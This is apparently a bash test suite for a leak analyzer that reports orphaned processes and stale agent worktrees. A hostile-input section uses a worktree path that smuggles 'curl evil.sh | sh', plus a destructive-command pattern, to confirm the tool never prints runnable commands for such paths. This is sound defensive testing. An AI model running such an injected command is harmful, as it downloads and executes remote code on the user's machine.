#!/usr/bin/env bash
# Fixture test for the leaks analyzer (tools/advise-leaks.sh, plan §6 U5).
#
# The shebang is load-bearing (handoff §4.15): zsh does not word-split unquoted
# variables, so this must be a FILE run under bash, never pasted into a shell.
#
# Hermetic by construction. Every threshold case is driven through the PURE
# `leaks_findings()` half against captured scan output written into a mktemp
# sandbox — no ps, no lsof, no git, no live scan anywhere. That is the entire
# reason §3b splits the analyzer in two: a live end-to-end run would go red the
# day an orphan actually leaks, which is the day the tool is needed.
#
# The one live thing here is deliberate and narrow: a column-count assertion
# against `scan_worktrees 7 | head -1` (§3d). The captured fixtures encode a
# 9-column shape; if the parent function ever grows or loses a column, this
# fails loudly instead of every threshold passing against a shape that no
# longer exists.
set -uo pipefail

REPO="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")/.." && pwd)"
pass=0; fail=0; skip=0
ok()  { pass=$((pass + 1)); printf '  \033[32mok\033[0m    %s\n' "$1"; }
bad() { fail=$((fail + 1)); printf '  \033[31mFAIL\033[0m  %s\n' "$1"; }
skp() { skip=$((skip + 1)); printf '  \033[90mskip\033[0m  %s\n' "$1"; }

# shellcheck source=../tools/advise-leaks.sh
. "$REPO/tools/advise-leaks.sh" || { echo "cannot source tools/advise-leaks.sh"; exit 1; }

TMP=$(mktemp -d) || exit 1
trap 'rm -rf "$TMP"' EXIT

TAB=$(printf '\t')
NOW_OUT=""

# Denominators are environment (§3a). Default every case to "absent" and let the
# cases that care set them, because absent is the state the real machine is in
# until a disk scan has ever run.
unset CW_MEMSIZE_KB CW_VOLUME_TOTAL_KB
unset CLAUDE_WATCH_LEAKS_ORPHAN_WARN_HOURS CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB
unset CLAUDE_WATCH_LEAKS_WORKTREE_WARN_GIB

# --------------------------------------------------------------- utilities --
# run <orphan-rows|-> <worktree-rows|->   ("-" means that scan could not run)
run() {
  local o=$1 w=$2 oa= wa=
  if [ "$o" != "-" ]; then oa="$TMP/o.tsv"; printf '%s' "$o" > "$oa"; fi
  if [ "$w" != "-" ]; then wa="$TMP/w.tsv"; printf '%s' "$w" > "$wa"; fi
  NOW_OUT=$(leaks_findings "$oa" "$wa")
}
srow()  { printf '%s\n' "$NOW_OUT" | LC_ALL=C awk -F'\t' '$1 == "S"'; }
frow()  { printf '%s\n' "$NOW_OUT" | CW_ID="$1" LC_ALL=C awk -F'\t' 'BEGIN { i = ENVIRON["CW_ID"] } $1 == "F" && $3 == i'; }
field() { printf '%s\n' "$1" | CW_N="$2" LC_ALL=C awk -F'\t' 'BEGIN { n = ENVIRON["CW_N"] } { print $n }'; }
nf()    { printf '%s\n' "$1" | LC_ALL=C awk -F'\t' '{ print NF }'; }
nfrows(){ printf '%s\n' "$NOW_OUT" | LC_ALL=C awk -F'\t' '$1 == "F"' | grep -c . ; }

eq() {  # <desc> <got> <want>
  if [ "$2" = "$3" ]; then ok "$1"; else bad "$1 (got [$2], wanted [$3])"; fi
}

# Orphan T row: T <root_pid> <name> <age_s> <subtree_rss_kb> <nproc> <subtree_cpu>
t_row() { printf 'T\t%s\t%s\t%s\t%s\t%s\t%s\n' "$1" "$2" "$3" "$4" "${5:-1}" "${6:-0.0}"; }
# Worktree row: <status> <path> <main> <branch> <age_days> <dirty> <unpushed> <size_kb> <why>
w_row() { printf '%s\t%s\t/repo\t%s\t%s\t0\t0\t%s\t%s\n' "$1" "$2" "${3:-agent/x}" "${4:-30}" "$5" "${6:-clean}"; }

echo "leaks: severity from (value, threshold)"

# 2-hour, 300M tree — over the MB line, nowhere near the 24h line. warn.
run "$(t_row 111 node 7200 307200 3 1.5)" ""
eq "2h 300M tree -> warn"          "$(field "$(frow leaks.orphans)" 4)" warn
eq "  ... names the knob that fired" "$(field "$(frow leaks.orphans)" 9)" CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB
eq "  ... domain severity follows"   "$(field "$(srow)" 3)" warn

# 10-minute, 5M tree — under both lines but it exists at all. info.
run "$(t_row 222 vite 600 5120 1 0.1)" ""
eq "10m 5M tree -> info"           "$(field "$(frow leaks.orphans)" 4)" info
eq "  ... state stays complete"    "$(field "$(srow)" 4)" complete

# An old but tiny tree: the age line alone is enough. `or`, not `and` (§5).
run "$(t_row 333 python3 90000 4096 1 0.0)" ""
eq "25h 4M tree -> warn (age alone)" "$(field "$(frow leaks.orphans)" 4)" warn
eq "  ... reports the hours knob"    "$(field "$(frow leaks.orphans)" 9)" CLAUDE_WATCH_LEAKS_ORPHAN_WARN_HOURS
eq "  ... in seconds"                "$(field "$(frow leaks.orphans)" 7)" seconds

echo "leaks: boundaries, either side"

run "$(t_row 1 node 600 204800)" ""          # exactly 200M
eq "orphan 200M exactly -> warn"   "$(field "$(frow leaks.orphans)" 4)" warn
run "$(t_row 1 node 600 204799)" ""          # one KiB under
eq "orphan 200M minus 1K -> info"  "$(field "$(frow leaks.orphans)" 4)" info

run "$(t_row 1 node 86400 1024)" ""          # exactly 24h
eq "orphan 24h exactly -> warn"    "$(field "$(frow leaks.orphans)" 4)" warn
run "$(t_row 1 node 86399 1024)" ""          # one second under
eq "orphan 24h minus 1s -> info"   "$(field "$(frow leaks.orphans)" 4)" info

run "" "$(w_row STALE /a/wt1 '' '' 1048576)"     # exactly 1 GiB
eq "worktree 1GiB exactly -> warn" "$(field "$(frow leaks.worktrees)" 4)" warn
run "" "$(w_row STALE /a/wt1 '' '' 1048575)"     # one KiB under
eq "worktree 1GiB minus 1K -> info" "$(field "$(frow leaks.worktrees)" 4)" info

# The knobs actually move the line they name. Assigned on their own line and
# unset again, never as a `VAR=x run ...` prefix: bash keeps an assignment that
# prefixes a FUNCTION call in the shell afterwards, so the prefix form would
# silently retune every case below it.
CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB=100
run "$(t_row 1 node 600 153600)" ""
eq "ORPHAN_WARN_MB=100 promotes 150M" "$(field "$(frow leaks.orphans)" 4)" warn
unset CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB

CLAUDE_WATCH_LEAKS_WORKTREE_WARN_GIB=4
run "" "$(w_row STALE /a/wt1 '' '' 2097152)"
eq "WORKTREE_WARN_GIB=4 demotes 2GiB"  "$(field "$(frow leaks.worktrees)" 4)" info
unset CLAUDE_WATCH_LEAKS_WORKTREE_WARN_GIB

# is_uint discipline: a typoed knob is not rounded into a working threshold.
for badval in 2.5 -1 abc; do
  ( CLAUDE_WATCH_LEAKS_ORPHAN_WARN_MB="$badval" leaks_findings "$TMP/o.tsv" "$TMP/w.tsv" ) >/dev/null 2>&1
  eq "knob \"$badval\" exits 2" "$?" 2
done

echo "leaks: what it consumes, and what it must not"

# Removable is the parent's classification, consumed as-is (§3d). ACTIVE and
# UNSAFE never enter a reclaim total, so no finding can point at a live agent
# or at unpublished work.
run "" "$(w_row STALE    /a/stale    '' '' 1048576
          w_row PRUNABLE /a/prunable '' '' 1048576
          w_row ACTIVE   /a/active   '' '' 9999999
          w_row UNSAFE   /a/unsafe   '' '' 9999999)"
eq "reclaim counts STALE+PRUNABLE only" "$(field "$(frow leaks.worktrees)" 6)" 2097152
eq "  ... and reports it as reclaim_kb" "$(field "$(frow leaks.worktrees)" 10)" 2097152

run "" "$(w_row ACTIVE /a/active '' '' 9999999
          w_row UNSAFE /a/unsafe '' '' 9999999)"
eq "no removable -> no worktree finding" "$(nfrows)" 0
eq "  ... and the domain reads ok"       "$(field "$(srow)" 3)" ok

echo "leaks: degradation"

run "" ""
S=$(srow)
eq "empty scans -> S leaks ok"        "$(field "$S" 3)" ok
eq "  ... complete"                   "$(field "$S" 4)" complete
eq "  ... no reasons"                 "$(field "$S" 5)" ""
eq "  ... the exact sentence"         "$(field "$S" 6)" "no leaked processes, no removable worktrees"
eq "  ... no remedy"                  "$(field "$S" 7)" ""
eq "  ... zero findings"              "$(nfrows)" 0
eq "  ... seven fields"               "$(nf "$S")" 7

run - -
S=$(srow)
eq "no scan at all -> unknown"        "$(field "$S" 3)" unknown
eq "  ... unavailable"                "$(field "$S" 4)" unavailable
eq "  ... never ok, never a finding"  "$(nfrows)" 0
if [ -n "$(field "$S" 7)" ]; then ok "  ... carries a remedy"; else bad "  ... carries a remedy"; fi

run - "$(w_row STALE /a/wt1 '' '' 4096)"
S=$(srow)
eq "one scan missing -> partial"      "$(field "$S" 4)" partial
eq "  ... with a reason"              "$(field "$S" 5)" scan_permission_denied
# The invariant, asserted the other way round too: partial is measured, so it
# may not claim unknown, and a measured half may still report its findings.
if [ "$(field "$S" 3)" != unknown ]; then ok "  ... partial is never unknown"; else bad "  ... partial is never unknown"; fi

echo "leaks: shares and the missing denominator (§3a)"

# Both denominators absent — the live state until a disk scan has ever run.
run "$(t_row 1 node 600 307200)" "$(w_row STALE /a/wt1 '' '' 1048576)"
eq "orphan share with no CW_MEMSIZE_KB"      "$(field "$(frow leaks.orphans)" 5)" 0
eq "worktree share with no CW_VOLUME_TOTAL_KB" "$(field "$(frow leaks.worktrees)" 5)" 0
CW_VOLUME_TOTAL_KB=0; CW_MEMSIZE_KB=0
run "$(t_row 1 node 600 307200)" "$(w_row STALE /a/wt1 '' '' 1048576)"
eq "zero denominator is not divided by"      "$(field "$(frow leaks.orphans)" 5)" 0
eq "  ... nor the worktree one"              "$(field "$(frow leaks.worktrees)" 5)" 0

CW_MEMSIZE_KB=16777216; CW_VOLUME_TOTAL_KB=442287516
run "$(t_row 1 node 600 307200)" "$(w_row STALE /a/wt1 '' '' 1048576)"
eq "orphan share with a denominator"         "$(field "$(frow leaks.orphans)" 5)" 0.0183
eq "worktree share with a denominator"       "$(field "$(frow leaks.worktrees)" 5)" 0.0024

# "still parses" means exactly that: no nan, no inf, nothing a JSON reader
# rejects. Assert it with a JSON reader rather than by eyeballing the string.
if command -v python3 >/dev/null 2>&1; then
  unset CW_MEMSIZE_KB CW_VOLUME_TOTAL_KB
  run "$(t_row 1 node 600 307200)" "$(w_row STALE /a/wt1 '' '' 1048576)"
  if printf '%s\n' "$NOW_OUT" | python3 -c '
import json, sys
n = 0
for line in sys.stdin:
    f = line.rstrip("\n").split("\t")
    if f[0] != "F":
        continue
    n += 1
    # share, value, threshold, reclaim_kb must be JSON numbers, never nan/inf.
    for i in (4, 5, 7, 9):
        v = json.loads(f[i])
        if not isinstance(v, (int, float)) or v != v or v in (float("inf"), float("-inf")):
            raise SystemExit("bad number: " + f[i])
    if not 0 <= json.loads(f[4]) <= 1:
        raise SystemExit("share out of range")
sys.exit(0 if n == 2 else 1)
' 2>/dev/null; then ok "numeric fields are JSON numbers with no denominators"
  else bad "numeric fields are JSON numbers with no denominators"; fi
else
  skp "JSON number check (no python3)"
fi

echo "leaks: hostile text (§3b)"

# §3b, the field-stripper itself: a tab reaching the emitter has already
# mis-split the row, so severity reads as a number and the finding is silently
# garbage. Tabs, newlines and other control bytes all become spaces.
eq "clean() flattens tab, newline and control bytes" \
   "$(leaks_clean "$(printf 'a\tb\nc\001d\177e')")" "a b c d e"

# A tab inside a P row argv is the realistic hostile input: argv is arbitrary
# bytes and the parent emits it last on the line. Nothing here reads P rows —
# every number comes off the T row — and this is the assertion that goes red the
# day someone starts reading them without care.
run "$(t_row 1 node 600 307200 3
       printf 'P\t1\t1\t0\t307200\t600\tnode --flag\targv\twith\ttabs\n')" ""
F=$(frow leaks.orphans)
eq "tab in an argv: 14 fields out"        "$(nf "$F")" 14
eq "  ... S row still 7 fields"           "$(nf "$(srow)")" 7
eq "  ... P rows never enter the total"   "$(field "$F" 6)" 307200
eq "  ... one tree, not four"             "$(printf '%s' "$F" | grep -c '1 leaked process tree,')" 1

# A control byte inside a path, on the other hand, is NOT a separator: it
# survives the split and reaches the emitted action intact unless it is scrubbed.
run "" "$(w_row STALE "$(printf '/a/wt\001x')" '' '' 4096)"
F=$(frow leaks.worktrees)
eq "control byte in a path: 14 fields out" "$(nf "$F")" 14
eq "  ... scrubbed out of the action"      "$(field "$F" 14 | LC_ALL=C grep -c '[[:cntrl:]]')" 0
eq "  ... and reported for manual handling" "$(field "$F" 14 | grep -c '/a/wt x — path needs manual handling')" 1

# A path outside the safe charset gets no command at all — a correctly quoted
# `rm -rf 'x; curl evil.sh | sh'` is safe to run and still a terrible thing to
# hand someone to paste.
run "" "$(w_row STALE '/a/wt; curl evil.sh | sh' '' '' 4096)"
A=$(field "$(frow leaks.worktrees)" 14)
if printf '%s' "$A" | grep -q 'claude-watch-reap'; then bad "metachar path: no command printed"; else ok "metachar path: no command printed"; fi
eq "  ... says so"                        "$(printf '%s' "$A" | grep -c 'path needs manual handling')" 1
eq "  ... action is still one field"      "$(nf "$(frow leaks.worktrees)")" 14

run "" "$(w_row STALE '/Users/x/Dev/wt 1' '' '' 4096)"
A=$(field "$(frow leaks.worktrees)" 14)
eq "safe path: quoted, and points at the reap skill" \
   "$(printf '%s' "$A" | grep -c "/claude-watch-reap.*'/Users/x/Dev/wt 1'")" 1
if printf '%s' "$A" | grep -qE -- '--kill|--remove|rm -rf'; then
  bad "  ... never a destructive command"
else
  ok "  ... never a destructive command"
fi

run "$(t_row 1 node 600 307200)" ""
eq "orphan action points at the reap skill" \
   "$(printf '%s' "$(field "$(frow leaks.orphans)" 14)" | grep -c '/claude-watch-reap')" 1

echo "leaks: live shape (§3d)"

# Captured fixtures encode a 9-column worktree row. If scan_worktrees drifts,
# every assertion above would keep passing against a shape that no longer
# exists — so ask the live function what it emits today.
(
  set -- --help
  # shellcheck source=../claude-watch
  . "$REPO/claude-watch" >/dev/null 2>&1
  init_live_cwds
  scan_worktrees 7 2>/dev/null | head -n1
) > "$TMP/live-wt.tsv" 2>/dev/null
if [ -s "$TMP/live-wt.tsv" ]; then
  eq "live scan_worktrees emits 9 columns" "$(nf "$(cat "$TMP/live-wt.tsv")")" 9
else
  skp "live scan_worktrees column count (no agent worktrees on this machine)"
fi

printf '%d passed, %d failed, %d skipped\n' "$pass" "$fail" "$skip"
[ "$fail" -eq 0 ]
